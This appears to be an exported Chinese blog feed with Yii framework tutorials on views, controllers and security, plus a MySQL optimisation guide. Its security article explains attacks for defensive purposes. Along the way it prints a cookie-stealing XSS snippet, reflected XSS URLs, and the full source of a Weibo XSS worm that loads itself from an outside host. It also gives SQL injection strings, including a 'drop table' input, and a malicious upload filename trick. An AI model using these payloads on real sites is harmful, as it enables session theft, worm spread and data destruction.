注册csrf &lt;?= Html::csrfMetaTags() ?&gt; &lt;title&gt;&lt;?= Html::encode($this-&gt;title) ?&gt;&lt;/title&gt; &lt;?php $this-&gt;head() ?&gt;&lt;/head&gt;&lt;body&gt;&lt;?php $this-&gt;beginBody() ?&gt; &lt;header&gt;My Company&lt;/header&gt; &lt;?= $content ?&gt; &lt;footer&gt;&amp;copy; 2014 by My Company&lt;/footer&gt;&lt;?php $this-&gt;endBody() ?&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php $this-&gt;endPage() ?&gt; 注意各个方法所在的位置 beginPage() 方法这个就是开启一个ob，并触发一个事件12345678public function beginPage()&#123; // 开启ob ob_start(); ob_implicit_flush(false); // 触发事件 $this-&gt;trigger(self::EVENT_BEGIN_PAGE);&#125; head() 方法只是输出了一个占位符1234public function head()&#123; echo self::PH_HEAD;&#125; beginBody() 方法输出占位符，并触发一个事件12345public function beginBody()&#123; echo self::PH_BODY_BEGIN; $this-&gt;trigger(self::EVENT_BEGIN_BODY);&#125; endBody() 方法触发一个事件，并输出占位符，同时注册 AssetBundle 资源，这个并不打算多说，也不是重点123456789public function endBody()&#123; $this-&gt;trigger(self::EVENT_END_BODY); echo self::PH_BODY_END; // 注册资源 foreach (array_keys($this-&gt;assetBundles) as $bundle) &#123; $this-&gt;registerAssetFiles($bundle); &#125;&#125; endPage() 方法看下面的方法，是通过替换占位符来将不同的资源注册到相应的位置的123456789101112131415public function endPage($ajaxMode = false)&#123; $this-&gt;trigger(self::EVENT_END_PAGE); # 获取页面内容 $content = ob_get_clean(); // 替换预留位置 加载注册的js/css 和标签 echo strtr($content, [ // 注册需要注册在头部的html self::PH_HEAD =&gt; $this-&gt;renderHeadHtml(), self::PH_BODY_BEGIN =&gt; $this-&gt;renderBodyBeginHtml(), self::PH_BODY_END =&gt; $this-&gt;renderBodyEndHtml($ajaxMode), ]); $this-&gt;clear();&#125; 看了原理之后，注册资源的方法就自己看吧。我不太想用，也就不细讲了 视图事件View 视图组件会在视图渲染过程中触发几个事件， 可以在内容发送给终端用户前，响应这些事件来添加内容到视图中或调整渲染结果。 例如，如下代码将当前日期添加到页面结尾处：123\Yii::$app-&gt;view-&gt;on(View::EVENT_END_BODY, function () &#123; echo date('Y-m-d');&#125;); 下面是debug模块在启动的时候注册的前端显示debug导航条的代码123456789101112public function bootstrap($app)&#123; ... // 绑定声明周期事件 // delay attaching event handler to the view component after it is fully configured $app-&gt;on(Application::EVENT_BEFORE_REQUEST, function () use ($app) &#123; // 前端页面注册debug小工具图标 $app-&gt;getView()-&gt;on(View::EVENT_END_BODY, [$this, 'renderToolbar']); $app-&gt;getResponse()-&gt;on(Response::EVENT_AFTER_PREPARE, [$this, 'setDebugHeaders']); &#125;); ...&#125; 安全先看一下官网的介绍，详细的请看安全篇的文章 当创建生成HTML页面的视图时，在显示之前将用户输入数据进行转码和过滤非常重要， 否则，你的应用可能会被 跨站脚本(用户输入的前端代码) 攻击。 要显示纯文本，先调用 yii\helpers\Html::encode() 进行转码， 例如如下代码将用户名在显示前先转码：1234567&lt;?phpuse yii\helpers\Html;?&gt;&lt;div class="username"&gt; &lt;?= Html::encode($user-&gt;name) ?&gt;&lt;/div&gt; 要显示HTML内容，先调用 yii\helpers\HtmlPurifier 过滤内容， 例如如下代码将提交内容在显示前先过滤：1234567&lt;?phpuse yii\helpers\HtmlPurifier;?&gt;&lt;div class="post"&gt; &lt;?= HtmlPurifier::process($post-&gt;text) ?&gt;&lt;/div&gt; 提示： HTMLPurifier在保证输出数据安全上做的不错，但性能不佳，如果你的应用需要高性能可考虑 缓存 过滤后的结果。 小部件方法其实下面的一些方法，都是将小部件封装到了 view 的方法中 嵌套布局一个布局嵌套在另一个布局内，可以实现多层嵌套布局用的是 ContentDecorator 小部件123456789101112content.php 子布局文件//嵌套方法//@app/views/layouts/main.php 表示要嵌套在main.php布局内，填充父布局的 $content 变量 &lt;?php $this-&gt;beginContent('@app/views/layouts/main.php'); ?&gt;&lt;hr&gt;&lt;?=$content ;?&gt;&lt;hr&gt;&lt;?php $this-&gt;endContent(); ?&gt;//main.php yii默认布局，不用动 控制器修改布局为子布局 $this-&gt;loayout = 'content'; 使用数据块视图文件中定义数据块，布局文件根据逻辑判断使用数据块，用来做网页布局部分不相同的视图部分用的是 Block 小部件，同样这个小部件用 view 组件的 blocks 属性来存放创建的数据块123456789101112//视图文件定义数据块 &lt;?php $this-&gt;beginBlock('block1'); ?&gt;...content of block1...&lt;?php $this-&gt;endBlock(); ?&gt;//布局文件使用数据块 &lt;?php if (isset($this-&gt;blocks['block1'])): ?&gt; &lt;?= $this-&gt;blocks['block1'] ?&gt;&lt;?php else: ?&gt; ... default content for block1 ...&lt;?php endif; ?&gt;]]></content>
      <categories>
        <category>yii</category>
        <category>视图层</category>
      </categories>
      <tags>
        <tag>yii-view</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-controller]]></title>
    <url>%2F2017%2F07%2F03%2Fyii%2F%E6%8E%A7%E5%88%B6%E5%99%A8-Controller%2F</url>
    <content type="text"><![CDATA[前言控制器作为最常用的一个类，也比较简单，这里只简单梳理一下因为常用的是web形式，这里就以 yii\web\Controller 为基础进行分析 属性常用属性列表12345$id # 控制器id$module # 如果有，则是该控制器所在的module模块对象 $defaultAction # 默认的action，在请求没有指定控制器的action的时候默认请求这个 $layout # 指定layout文件，如果不使用layout设置值为 false ，后面会详细分析 $enableCsrfValidation # 是否验证csrf, 如果关闭，在beforeAction 中将不进行校验 执行操作通过下面这两种方式执行action和正常的通过对象调用执行有什么区别？直接通过对象调用的方式执行某个方法，只是执行了这个方法；而通过下面这两种方式(通过路由)执行的方式会完整的执行所属modules、controller的 beforeAction 和 afterAction(动作过滤器) runAction() 执行本控制器的action通过本控制器的 actionId 完整的执行(就是包含动作过滤器)对应的 独立action 或 内联action run() 根据路由相应的动作看下面源码先有三种不同的情况 单独一个actionid 执行相对当前控制器下的action controllerid/actionid || module/controllerid/actionid 执行相对当前module下的路由 /module/controllerid/actionid 执行绝对路由 其中第三种就是我们发送请求的时候所要执行的操作，而第二种其实和第三种是一样的($app也是module)，只不过使用当前module往后找1234567891011121314151617181920/** * 运行路由指向的action * 三种路由形式 * 1. 单独一个actionid 执行相对当前控制器下的action * 2. controllerid/actionid 执行相对当前module * 3. /module/controllerid/actionid 绝对路由 */public function run($route, $params = [])&#123; $pos = strpos($route, '/'); // route 不包含 / 执行本控制器的action if ($pos === false) &#123; return $this-&gt;runAction($route, $params); // route 为 controller/action 的形式，执行本module下的控制器方法 &#125; elseif ($pos &gt; 0) &#123; return $this-&gt;module-&gt;runAction($route, $params); &#125; // route 以 / 开头 和路由一样了 return Yii::$app-&gt;runAction(ltrim($route, '/'), $params);&#125; 钩子方法||方法过滤器就是在执行动作之前 beforeAction 进行请求过滤,在请求之后 afterAction 进行结果过滤，基础控制器中这两个方法都会触发响应的事件看一下web在 beforeAction 进行的csrf验证1234567891011121314151617181920212223242526272829303132333435363738394041/** * 执行动作之前 ， 验证 csrf csrf验证 * @inheritdoc */public function beforeAction($action)&#123; if (parent::beforeAction($action)) &#123; if ($this-&gt;enableCsrfValidation &amp;&amp; Yii::$app-&gt;getErrorHandler()-&gt;exception === null &amp;&amp; !Yii::$app-&gt;getRequest()-&gt;validateCsrfToken()) &#123; throw new BadRequestHttpException(Yii::t('yii', 'Unable to verify your data submission.')); &#125; return true; &#125; return false;&#125;``` ## 视图相关 ### 设置 layout 布局文件 根据 `findLayoutFile()` 方法可以知道根据 `layout` 属性值的不同获取 layout 的方法也不相同 1. `$this-&gt;layout = false` 不使用layout 2. `$this-&gt;layout = @abc/ad.php` 以别名的形式开头指定layout路径，直接用的就是这个文件 3. `$this-&gt;layout = /ding.php` 以绝对路径指定layout路径，用的是 `$app` 模块下默认layout文件夹下的对应的文件 4. `$this-&gt;layout = ding` 使用当前模块下layout文件夹下的对应的文件5. `$this-&gt;layout = null` 默认情况，如果当前moudle设置了 `layout` 属性，则使用该模块下layout文件夹下的 `layout` 属性值所代表的文件，如果当前模块没有设置，则往上一级模块寻找，直到 `$app` 模块 ### 渲染视图相关 渲染视图功能其实是通过 `view` 组件实现的，这里先简单说一下, 下面的四个方法其实极其的相似 #### render 方法 `render()` 方法会根据传入 `$view` 值的形式不同而去找相对应的文件 1. `@abc/efg.php` 以别名 `@` 形式，直接通过别名找到对应的文件 2. `//abc/ding.php` 以 `//` 开头的，直接从 `$app` 模块的 views 目录下开始找对应的文件 3. `/abc/ding.php` 以 `/` 开头的，从 **当前模块** 的 views 目录下开始找对应的文件 4. `ding` 这种就是我们最长用的，就是找当前模块视图文件夹下控制器对应的文件夹下的视图文件 ```phppublic function render($view, $params = [])&#123; // 视图文件经过变量替换后的内容 $content = $this-&gt;getView()-&gt;render($view, $params, $this); return $this-&gt;renderContent($content);&#125; renderPartial 不使用layout这个就更简单了，和 render() 方法的唯一区别就是不使用layout了1234public function renderPartial($view, $params = [])&#123; return $this-&gt;getView()-&gt;render($view, $params, $this);&#125; renderContent 将字符串填充到layout就是将 $content 填充到layout文件中，上面的 render() 方法就用到了123456789public function renderContent($content)&#123; $layoutFile = $this-&gt;findLayoutFile($this-&gt;getView()); if ($layoutFile !== false) &#123; // 渲染layout return $this-&gt;getView()-&gt;renderFile($layoutFile, ['content' =&gt; $content], $this); &#125; return $content;&#125; renderFile 直接指定要渲染的文件路径上面的三个方法，最终都需要通过 View::renderFile() 方法来获取文件数据的，只不过 render() 方法有找对应文件的规则罢了1234public function renderFile($file, $params = [])&#123; return $this-&gt;getView()-&gt;renderFile($file, $params, $this);&#125; 独立动作 action使用场景：多个控制器都用到同样的方法，或者是作为第三方扩展方便引入。只需要在控制器中配置一下，指定一下动作id，即可通过该控制器进行访问。 比较简单但又常用到，偷个懒直接 引用一下官方文档 内容独立操作通过继承 yii\base\Action 或它的子类来定义。 例如Yii发布的 yii\web\ViewAction 和 yii\web\ErrorAction 都是独立操作。 要使用独立操作，需要通过控制器中覆盖 yii\base\Controller::actions() 方法在中申明， 如下例所示：12345678910111213public function actions()&#123; return [ // 用类来申明"error" 动作 'error' =&gt; 'yii\web\ErrorAction', // 用配置数组申明 "view" 动作 'view' =&gt; [ 'class' =&gt; 'yii\web\ViewAction', 'viewPrefix' =&gt; '', ], ];&#125; 页面跳转作为方便，这里封装了四个跳转相关的方法，其中用到的一些其他类的方法，请跳转到对应的文章查看 redirect 页面跳转Url 帮助类1234public function redirect($url, $statusCode = 302)&#123; return Yii::$app-&gt;getResponse()-&gt;redirect(Url::to($url), $statusCode);&#125; goHome 跳转到首页1234public function goHome()&#123; return Yii::$app-&gt;getResponse()-&gt;redirect(Yii::$app-&gt;getHomeUrl());&#125; goBack 返回上一页(上一个记录的链接)这个依赖于 cookie 因为用的 session 进行保存访问记录的首先在访问的时候记录一下访问的路由1234567891011121314// 记录访问路由Yii::$app-&gt;getUser()-&gt;setReturnUrl(['admin/index', 'ref' =&gt; 1]);// 记录访问路由，和上面一样。方便一点 Url::remember(['admin/index', 'ref' =&gt; 1]);// 控制器中跳转到上一个记录点 $this-&gt;goBack();``` 通过下面的方法进行跳转上个记录点 ```phppublic function goBack($defaultUrl = null)&#123; return Yii::$app-&gt;getResponse()-&gt;redirect(Yii::$app-&gt;getUser()-&gt;getReturnUrl($defaultUrl));&#125; refresh 刷新当前页1234public function refresh($anchor = '')&#123; return Yii::$app-&gt;getResponse()-&gt;redirect(Yii::$app-&gt;getRequest()-&gt;getUrl() . $anchor);&#125;]]></content>
      <categories>
        <category>yii</category>
        <category>controller</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>controller</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-安全篇]]></title>
    <url>%2F2017%2F07%2F02%2Fyii%2F%E5%AE%89%E5%85%A8%E7%AF%87%2F</url>
    <content type="text"><![CDATA[前言对于如何攻研究的不深，只说说大概原理，让你知道怎么防 xss攻击原理：后端有时会将接收用户的数据展示在前端页面，这时候如果后端没有做处理，那么提交的前端代码将会直接渲染到前端，这部分代码就具有攻击性 实现xss攻击要想方设法把js注入到页面中，可以通过url(反射性) 或者 提交数据(提交的数据会保存在后台，显示在页面)跨站脚本攻击(Cross Site Scripting)将js代码插入到给用户使用的页面中，从而对用户进行攻击 盗取用户账号(使用cookie登陆)将下面代码出入页面，当用户访问这个页面的时候将会把cookie发送给自己，在cookie中寻找需要的登陆cookie1234&lt;script&gt;var cookie = document.cookie;window.location.href = 'http://127.0.0.1/index.php?cookie = '+cookie&lt;/script&gt; 将cookie设置成httponly，js将无法读取这条cookie非法转账 自动转账的代码逻辑，自动填写并确认跳转1234document.getElementById('ipt-search-key').value = 'ding@163.com';//自动填写转账的账户document.getElementById('amount').value = '100';//自动填写转账的金额document.getElementById('reason').value = '劫富济贫';//自动填写原因document.getElementsByClassName('ui-button-text')[0].click();//自动跳转 将javascript注入到其他页面，但是需要注入到用户使用的转账的页面，这个是比较难的，需要使用反射性xxs 反射性xss原理：将js代码赋值给url需要get传参的key，后台获取到这个key又会原原本本的将这个key输出到前端页面选好需要攻击的网站页面，url需要有get传参的内容，确定后台获取到get传参的key值会将其原原本本的输出到前端页面，这样就可以进行攻击了 将js代码赋值给url的get需要传参的key，例如1234567//urlwww.basic.com/index.php?r=article/post&amp;name=abc&lt;script&gt;alert(&apos;hello world&apos;)&lt;/script&gt;//but，浏览器会智能过滤掉js标签 //可以通过后端设置响应头让其不过滤\YII:$app-&gt;response-&gt;headers-&gt;add(&apos;x-xss-Protection&apos;, &apos;0&apos;);//后端的逻辑是直接将获取到的name直接到页面echo \YII:$app-&gt;request-&gt;get(&apos;name&apos;); 输出的内容可能被编码转换成字符串,导致无法执行例如：12&quot;abc%3Cscript%3Ealert(&apos;hello world&apos;)%3C/script%3E&quot;//%3Cscript%3E即&lt;script&gt; 假设，后台获取到这个name值后将其放进了js中(可以通过实验，查看源码，看后台将获取到的数据放到哪里了)123456789&lt;script&gt;...&#123; ... pageAbsUrl:"...name=abc%3Cscript%3Ealert('hello world')%3C/script%3E" ...&#125;...&lt;/script&gt; 因为，已经有了&lt;script&gt;标签，所以传入的不需要 &lt;script&gt; 标签了，根据放入的位置拼装执行代码最后可执行的代码的样子123456789&lt;script&gt;...&#123; ... pageAbsUrl:"...name=abc",alert('hello world')//" ...&#125;...&lt;/script&gt; 所以需要将url改成1www.basic.com/index.php?r=article/post&amp;name=abc&quot;,alert(&apos;hello world&apos;)// 又一个问题，经过自动编译处理将会把 &quot; 变成 %22 导致无法执行这就需要使用 HTML实体编码HTML实体编码查看HTML实体编码表&quot;可以使用 &amp;quot; 代替但是url会根据 &amp; 进行参数分割可以使用url编码将 &amp; 编码 %26url编码通过查看URL编码表js的 escape()方法 最后，因为获取内容放在 &lt;script&gt; 中，在js环境中是不认识HTML实体编码的，所以还是无法执行但是，如果没有在 &lt;script&gt; 的是可行的 xxs蠕虫攻击xxs worm页面中插入js代码，发布，当用户访问的时候，又会以访问用户的身份发布文章，感染性极强 示例1http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update 使用js的 uneacape() 将转义一下可以看到1&quot;http://weibo.com/pub/star/g/xyyyd&quot;&gt;&lt;script src=//www.2kt.cn/images/t.js&gt;&lt;/script&gt;?type=update&quot; 当用户访问这个页面的时候将会去加载 t.js,在t.js中实现逻辑12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485function createXHR()&#123; return window.XMLHttpRequest? new XMLHttpRequest(): new ActiveXObject("Microsoft.XMLHTTP");&#125;function getappkey(url)&#123; xmlHttp = createXHR(); xmlHttp.open("GET",url,false); xmlHttp.send(); result = xmlHttp.responseText; id_arr = ''; id = result.match(/namecard=\"true\" title=\"[^\"]*/g); for(i=0;i&lt;id.length;i++)&#123; sum = id[i].toString().split('"')[3]; id_arr += sum + '||'; &#125; return id_arr;&#125;function random_msg()&#123; link = ' http://163.fm/PxZHoxn?id=' + new Date().getTime();; var msgs = [ '郭美美事件的一些未注意到的细节：', '建党大业中穿帮的地方：', '让女人心动的100句诗歌：', '3D肉团团高清普通话版种子：', '这是传说中的神仙眷侣啊：', '惊爆!范冰冰艳照真流出了：', '杨幂被爆多次被潜规则:', '傻仔拿锤子去抢银行：', '可以监听别人手机的软件：', '个税起征点有望提到4000：']; var msg = msgs[Math.floor(Math.random()*msgs.length)] + link; msg = encodeURIComponent(msg); return msg;&#125;function post(url,data,sync)&#123; xmlHttp = createXHR(); xmlHttp.open("POST",url,sync); xmlHttp.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"); xmlHttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8"); xmlHttp.send(data);&#125;function publish()&#123; url = 'http://weibo.com/mblog/publish.php?rnd=' + new Date().getTime(); data = 'content=' + random_msg() + '&amp;pic=&amp;styleid=2&amp;retcode='; post(url,data,true);&#125;function follow()&#123; url = 'http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&amp;atnId=profile&amp;rnd=' + new Date().getTime(); data = 'uid=' + 2201270010 + '&amp;fromuid=' + $CONFIG.$uid + '&amp;refer_sort=profile&amp;atnId=profile'; post(url,data,true);&#125;function message()&#123; url = 'http://weibo.com/' + $CONFIG.$uid + '/follow'; ids = getappkey(url); id = ids.split('||'); for(i=0;i&lt;id.length - 1 &amp; i&lt;5;i++)&#123; msgurl = 'http://weibo.com/message/addmsg.php?rnd=' + new Date().getTime(); msg = random_msg(); msg = encodeURIComponent(msg); user = encodeURIComponent(encodeURIComponent(id[i])); data = 'content=' + msg + '&amp;name=' + user + '&amp;retcode='; post(msgurl,data,false); &#125;&#125;function main()&#123; try&#123; publish(); &#125; catch(e)&#123;&#125; try&#123; follow(); &#125; catch(e)&#123;&#125; try&#123; message(); &#125; catch(e)&#123;&#125;&#125;try&#123; x="g=document.createElement('script');g.src='http://www.2kt.cn/images/t.js';document.body.appendChild(g)";window.opener.eval(x);&#125;catch(e)&#123;&#125;main();var t=setTimeout('location="http://weibo.com/pub/topic";',5000); 预防1.使用 \yii\helpers\Html::encode(&#39;内容&#39;); 进行html实体编码转义2.将过滤掉js的代码 \yii\helpers\HtmlPurifier::process(&#39;内容&#39;); 浏览器认为哪段是js代码，yii就根据浏览器相同的算法识别出js代码 CSRF攻击原理：跨站请求伪造，假设要攻击A网站，在B网站通过伪装的访问A网站的链接，当用户进行点击或者提交表单的时候数据是给到A网站的，从而实现攻击。一般并不会有什么问题，大多数有破坏性的操作都是需要登录的。(这里就要用到登录，这个登录要么诱骗，要么撞运气，目标已经登录过那个网站并且用了自动登陆功能，这样在访问目标网站的时候，会携带上自动登陆的cookie信息从而实现登陆)。不需要js来去辅助执行 get类型的CSRF攻击例如，某网上银行的漏洞12http://www.xxxbank.com/index.php?from=zhangsan&amp;to=lisi&amp;money=400//zhangsan转给lisi400块 post类型的CSRF攻击需要用户先登录，仿照需要攻击的网站的表单，设法让用户访问自己的仿照的表单发送给攻击的网站而达成目的 CSRF防御 判断 Referer 头,但是有时候请求不会携带这个请求头 防伪措施，请求表单的时候，将防伪标识插入到表单，表单提交的时候进行比对 yii默认是开启防止CSRF攻击的 表单中加入 name = _csrf 的隐藏input标签同时将 _csrf 存入到cookie中，请求的时候两个都会进行携带，进行比对，cookie中的是加过密的，后台获取后进行解密，并和表单进行比对获取 _csrf 的值1\YII::$app-&gt;requrst-&gt;csrfToken; sql注入现在由于框架的支持，sql注入已经很难了。但也可能那个倒霉蛋不用框架给的方法，而是自己拼接sql，那问题还是有的 登陆示例 这个示例以一个拼接且逻辑错误的sql来演示 根据账号密码查询进行登陆(错误的师范，请勿参考)的sql示例1select * from users where name = 'zhangsan' and password = 'xxxxx' 只输入已存在的用户名实现登陆 12# 用户名输入 zhangsan' -- 即可破解 # --在mysql表示注释select * from users where name = 'zhangsan' --' and password = 'xxxxx' 删除表，如果 users 表存在则会进行删除 12# 用户名输入 '; drop table users; -- 将会删除users表select * from users where name = ''; drop table users; --' and password = 'xxxxx' 查询示例根据关键字进行查询关键词进行查询，并限制条件的sql示例1select * from articles where score&lt;60 and title like '%关键词%' 实现查询出关键词相关的所有结果 12将关键词设置为 abc' or 1=1 -- 即可破解 or也可以使用 || 代替 select * from articles where score&lt;60 and title like 'abc' or 1=1 -- ' 还有就是使用编码导致的(GBK),php将 &#39; 单引号转义后 \&#39; 如果遇到特殊的字符一起，并不能很好会将前面的字符和 \ 组成一个字符，而将 &#39; 暴漏出来，导致入侵 sql防范使用框架自带的方法，不要自己拼接sql，因为框架处理的逻辑是先将sql通过pdo进行预处理，然后在绑定参数进行查询，这就避免了sql注入 文件上传漏洞Fiddler工具可以抓取浏览器的请求，并进行阻断Rules—&gt;Automatic Breakpoints—&gt;Before Requests 添加断点，在请求发出去前进行阻断，修改后可以 Run to Completion 继续进行请求 可以修改文件的type，然后通过系统的漏洞来利用上传漏洞系统在命名文件的时候是不允许使用特殊符号的例如 : ,通过修改器截获的请求，将文件名改成 photo.php:x.jpg ,如果在后端是使用上传的原文件名 name 进行保存的1move_uploaded_file($_FILES[&apos;photo&apos;][&apos;tmp_name&apos;], &apos;./&apos;.$_FILES[&apos;photo&apos;][&apos;name&apos;]); 在保存 photo.php:x.jpg 的时候将会保存成 photo.php 防范 既然上传的文件类型不可信，就使用扩展获取到文件MIME类型进行判断 不要使用用户给的文件名 存放上传文件的文件夹不要用可执行权限 参考：慕课网-安全篇]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>yii安全</tag>
        <tag>xss</tag>
        <tag>csrf</tag>
        <tag>sql注入</tag>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网站优化-Mysql]]></title>
    <url>%2F2017%2F07%2F02%2Fmysql%2Fmysql%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[4个方向的优化 其一：设计方面。存储引擎的选择，列类型的选择 其二：功能方面。索引，查询缓存，分区。 其三：架构层面。读写分离，负载均衡。 其四：SQL层面。经验。 设计方面存储引擎的选择 存储数据的格式，方式常用的有两种，innodb 和 MyISAM 查看mysql支持的引擎情况1show engines\G MyISAM引擎 记录按照顺序插入进行存储的 12345678910USE test; #选用数据库CREATE TABLE myisam_1 ( id INT UNSIGNED NOT NULL AUTO_INCREMENT, title VARCHAR(8) NOT NULL DEFAULT '', PRIMARY KEY (id)) ENGINE = MYISAM CHARSET=utf8;#myisam引擎的INSERT INTO myisam_1 VALUES (23, '李牧');INSERT INTO myisam_1 VALUES (12, '王翦');INSERT INTO myisam_1 VALUES (34, '廉颇');INSERT INTO myisam_1 VALUES (15, '白起'); 数据和索引分别存储 test 数据库文件夹db.opt 数据库文件myisam_1.frm 表结构文件myisam_1.MYD 数据文件myisam_1.MYI 索引文件 表压缩myisam支持压缩存储制作一张大量数据的表，利用蠕虫复制(自身复制)技术，完成大量数据；1insert into myisam_1 select null,title from myisam_1; 多次执行后查看如果文件大小没有更新，可以刷新表写入到文件1flush table myisam_1; 查看文件大小 工具压缩查找123456find / -name myisampack发现工具目录 /usr/local/Cellar/mysql/5.7.18_1/binmyisampack 打包压缩myisamchk 检测修复 进入到数据库目录中/usr/local/var/mysql/test 可以通过 find / -name *.frm 查找 执行1myisampack myisam_1 //myisam_1是带压缩的表名 最后会显示1Remember to run myisamchk -rq on compressed tables 可以看出数据文件压缩，但是索引文件出问题了，需要重建修复索引1myisamchk -rq myisam_1 修复后索引正常 压缩后为只读表，不能再进行插入操作，仅仅可以完成更快速的查询工作 表解压如果需要对压缩过的表进行修改需要进行解压同样进入到要解压的数据库目录中1myisamchk --unpack myisam_1 执行后即可,如果文件大小没变，需要进入到mysql中执行1flush table 修复表myisam新增数据时，都是在表末尾完成的插入如果存在被删除的记录。所占用的记录空间就会空下来，但是不会再存放记录。最好定时，完成修复表空间漏洞！删除数据后myisam表的大小并不会发生改变 ，需要进行修复进入到需要修复的数据库的目录中12myisamchk -rq myisam_1 #修复索引 myisamchk -r myisam_1 #修复数据 myisam 不支持行锁，支持表锁，导致并发性降低 ；提供高效的查询、插入操作；不擅长大量更新、删除业务； innodb引擎mysql默认存储引擎支持事务，行级锁定，外键 存储机制数据按照主键顺序进行排序导致innodb的表的记录与逐渐索引存在一个结构中(聚簇)插入数据时，因为要额外的执行排序工作，导致插入速度相对较慢 创建innodb表12345678910USE test; #选用数据库CREATE TABLE innodb_1 ( id INT UNSIGNED NOT NULL AUTO_INCREMENT, title VARCHAR(8) NOT NULL DEFAULT '', PRIMARY KEY (id)) ENGINE = innodb CHARSET=utf8;#innodb引擎的INSERT INTO innodb_1 VALUES (23, '李牧');INSERT INTO innodb_1 VALUES (12, '王翦');INSERT INTO innodb_1 VALUES (34, '廉颇');INSERT INTO innodb_1 VALUES (15, '白起'); 查看文件 innodb_1.frm innodb的结构文件ibdata1 默认的innodb表空间文件，所有的innodb表的数据和索引都在该文件中(最新的默认为每个表分开存储)innodb_1.ibd innodb表空间文件(每个表单独存储的时候会有这个文件) 如果默认为所有的表存储在一个文件中，可以进行配置来实现每个表分开存储1show variables like 'innodb_file_per_table'; 如果值为 OFF 则为所有表存在一个文件中，进行设置更改即可1set global innodb_file_per_table = 1; innodb额外支持事务，外键约束，行级锁定擅长处理复杂数据完整性，一致性。擅长处理并发。 列类型的选择在满足需求的情况下尽可能占用小的存储空间尽可能使用整数类型整数行的运算速度最快，也可以考虑 Enum枚举 和 Set集合 类型，不过这两种也可以配合代码用数值型实现例如：存储 ipv4； varchar(15) 15+个字节可以将ip转换为int型的 int unsigned 就只需要4个字节ip转整1select inet_aton('192.168.1.234'); 整数转ip1select inet_ntoa(3232236010); 尽可能使用 not nullNull值，特殊值，mysql需要额外的存储空间存储。无论在计算，存储上都需要消耗资源。 逆范式 范式：规范的格式： 满足三范式：1NF：原子性。2NF：消除部分依赖。3NF：消除传递依赖。每张表，存储一类实体的信息。实体间通过关联字段进行联系。 但 有时需要 打破规范，来提升某种操作的效率：例如：1234567891011121314151617181920商品表：GoodsGoods_id, goods_name, cat_id分类表：categoryCat_id, cat_title,业务逻辑：分类列表分类ID，分类标题，分类下商品数量典型的实现：连接查询。Select c.cat_id, c.cat_title, count(g.goods_id) as goods_count from category as c left join goods as g On c.cat_id=g.cat_id group by c.cat_id where Condition如果 在查询分类列表时，通常需要 商品数量：则可以采用下面的设计：在分类表，增加商品数量的字段：分类表：categoryCat_id, cat_title,goods_count每当 商品 增，删，改的时候，修改相关分类的goods_count的值。但是，如果执行查询分类列表了，就不需要 连接操作：Select * from category; 优化根据具体的业务需求对表结构进行优化 功能方面索引在终端执行 select 语句的时候会显示执行时间例如：128388608 rows in set (2.79 sec)执行了2.79秒 可以通过设置索引对查询进行优化 索引就好比字典的目录，通过关键词获取记录所在位置通过使用 数据中的部分数据作为关键字，建立该关键字与数据间位置的对应关系，称之为索引。 在没有索引的情况下，定位记录，需要采用的是全表扫描，从第一条记录扫描到最后一条记录，确定要找的数据而索引的关键词是排序过的，查找的时候先在索引中进行检索，快速的定位该关键词对应的记录位置 索引的增删改查看 mysql基础 执行计划在执行sql之前，mysql会形成执行计划，内包含了当前的sql执行所采用的策略 mysql执行计划获取通过 explain select 语法1explain select * from test where id = 123456\G 123456789101112131415mysql&gt; explain select * from myisam_1 where id = 123456\G*************************** 1. row *************************** id: 1 select_type: SIMPLE table: myisam_1 partitions: NULL type: const #这是重要的列，显示连接使用了何种类型。从最好到最差的连接类型为const、eq_reg、ref、range、 indexhe和ALL，all为全表扫描possible_keys: PRIMARY #查询可能会使用到索引 key: PRIMARY #实际使用的索引 key_len: 4 #使用的索引的长度。在不损失精确性的情况下，长度越短越好 ref: const rows: 1 #MYSQL认为必须检查的用来返回请求数据的行数 filtered: 100.00 Extra: NULL #关于MYSQL如何解析查询的额外信息1 row in set, 1 warning (0.00 sec) 索引使用场景条件检索 wherewhere 后的字段如果有索引是可以使用索引的 排序 order byorder by 后的字段如果有索引是可以使用索引的 联表join 关联字段联接查询是，关联字段 (on后面的条件) 可以使用索引两个表的关联字段都要创建索引 索引使用语法细节字段独立字段需要使用索引时，要求，字段独立存在于表达式的一侧。不能参与表达式运算。函数调用。例如：12where id = 123456; #字段独立where id+1 = 123455; #字段未独立 左原则like模糊查询匹配字符串，左侧必须要固定才可以使用索引。即 like abc% 复合索引创建复合索引时，在使用索引的时候左边的字段才能直接使用该索引。左边字段确定时，右边字段的索引才可以使用。 原因：复合索引的关键字顺序，先按照左边字段排序，如果左边字段相同，则按照右边字段排，以此类推。 or原则要保证 OR两侧的条件表达式中的字段都有索引可以使用，才会用到索引。 mysql自动判断当搜索的记录数比较多时，mysql可能会放弃使用索引来减少大量的随机io开销，而选择使用顺序开销来代替例如：1where empno &gt; 1121212; 如果查询的记录数太多，会放弃索引 前缀索引 可以使用 某个字段的前一部分（左边）数据，作为索引的关键字，而不是使用全部的字段内容。称之为前缀索引。字段 32 字节长度。只使用前10个长度，作为索引关键字。目的：减少 关键字的长度，索引的速度就会提升！实际中，前缀 具有 足够的标识度，才可以使用前缀索引。 例如：以 密码为例： 首先需要计算当前缀达到多长时，标识度就够了。 先计算整体的标识度 1select 总记录条数／count(distinct epassword) from emp; #计算总条数除以不重复密码的比值 计算使用不同的前缀是的标识度的值，找到最接近的即可 1select 总记录条数／count(distinct substring(epassword, 1, n)) from emp; 随着 n 的不断增大，将会越来越接近整体标识度，并且随着增大标识度将会不变，这时去不变时的最小值最为前缀长度 建立前缀索引 1alter table emp add index 'index_password' (epassword(n)); #n为计算出的长度 查询缓存mysql服务器提供的可以缓存查询结果的缓存区12345678910mysql&gt; show 